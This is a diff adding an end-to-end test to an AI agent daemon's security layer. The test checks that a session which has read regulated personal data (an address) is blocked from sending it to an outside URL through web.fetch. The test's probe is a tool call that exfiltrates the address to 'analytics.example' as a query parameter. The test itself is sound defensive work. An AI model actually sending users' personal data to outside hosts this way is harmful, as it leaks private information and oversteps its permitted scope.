@@ -362,3 +362,42 @@ async def test_web_fetch_allowed_for_clean_session(paths: dict[str, Path]) -> No
         # or untrusted egress DENY.)
         assert "health-meets-egress" not in _text(fetch_result)
         assert "financial" not in _text(fetch_result)
+
+
+async def test_web_fetch_gated_for_personal_data_via_real_daemon(
+    paths: dict[str, Path],
+) -> None:
+    """#293/#296 — the PRIMARY reachable closure, proven end-to-end through the
+    real daemon: a session that has read `personal` (regulated-tier) data cannot
+    silently fetch it out to a non-allowlisted URL — the chokepoint requires
+    approval on the destination host. personal/proprietary_work are the
+    categories that actually reach a web.fetch in the default config (health/
+    financial are restricted-tier and refused at the mode floor)."""
+    daemon, app = await _build_daemon(paths)
+    personal_tag = CategoryTag(
+        "personal", Tier.REGULATED, assignment_provenance="source-declared"
+    )
+    app.memory.write("addr", "123 Main St", LabelState(a=frozenset({personal_tag})))
+    s = await app.graph.new(intent="personal exfil probe")
+    app.graph._sessions[s.id] = replace(
+        s,
+        capability_set=frozenset(
+            {
+                Capability(kind=CapabilityKind.READ_FS, pattern="*"),
+                Capability(kind=CapabilityKind.WEB_FETCH, pattern="*"),
+            }
+        ),
+    )
+
+    async with _running_daemon(daemon, paths["socket"]) as client:
+        read_result = await dispatch_tool(client, s.id, "memory.read", {"key": "addr"})
+        assert read_result.isError is False
+
+        fetch_result = await dispatch_tool(
+            client,
+            s.id,
+            "web.fetch",
+            {"url": "http://analytics.example/collect?d=123MainSt"},
+        )
+        assert fetch_result.isError is True
+        assert "regulated-data-meets-web-fetch" in _text(fetch_result)
